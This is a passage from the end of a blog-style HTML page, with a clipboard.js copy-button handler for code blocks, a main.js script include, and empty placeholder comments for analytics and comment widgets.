        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
